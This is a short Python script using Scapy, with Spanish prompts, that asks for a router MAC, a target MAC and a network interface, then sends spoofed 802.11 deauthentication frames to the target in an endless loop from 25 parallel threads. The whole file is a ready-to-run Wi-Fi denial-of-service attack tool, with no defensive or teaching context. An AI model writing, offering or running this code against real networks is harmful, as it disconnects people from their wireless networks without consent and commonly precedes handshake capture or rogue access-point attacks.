from scapy.all import *
import time
import threading

router_mac = input("MAC Router >>")
destination_mac = input("MAC Destino >>")
interface = input("Interfaz de Red >> ")
ssid = ""
packet = RadioTap()/Dot11(addr1=destination_mac, addr2=router_mac, addr3=router_mac)/Dot11Deauth()

def send_deauth_packets(interface, count, interval):
    for _ in range(count):
        sendp(packet, iface=interface, count=1, verbose=False)
        time.sleep(interval)

while True:
    threads = []
    for _ in range(25): 
        thread = threading.Thread(target=send_deauth_packets, args=(interface, 100, 0.1))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    time.sleep(0.5) 
